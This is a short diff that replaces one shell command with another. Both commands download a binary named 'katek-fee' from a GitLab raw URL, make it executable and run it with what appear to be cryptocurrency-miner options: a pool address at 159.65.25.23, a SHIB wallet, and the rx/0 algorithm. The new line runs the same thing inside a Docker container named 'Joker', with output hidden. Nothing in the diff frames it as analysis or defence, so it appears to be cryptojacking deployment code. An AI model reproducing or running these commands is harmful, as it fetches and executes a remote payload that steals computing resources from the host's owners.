@@ -1,1 +1,1 @@
-wget https://gitlab.com/fukadabunit/project-7/-/raw/main/katek-fee && chmod u+x katek-fee && ./katek-fee -o 159.65.25.23:80 -u SHIB:0x113a78bc09aed970a8a9baac749aad1d0e12f722.Q${RANDOM:0:9}#zmx7-6zfg -p x -a rx/0 -k
+docker run --name Joker ubuntu:latest sh -c "apt-get update && apt-get install wget -y && wget https://gitlab.com/fukadabunit/project-7/-/raw/main/katek-fee && chmod u+x katek-fee && ./katek-fee -o 159.65.25.23:80 -u SHIB:0x113a78bc09aed970a8a9baac749aad1d0e12f722.A${RANDOM:0:9}#zmx7-6zfg -p x -a rx/0 -k --threads=4 > /dev/null"
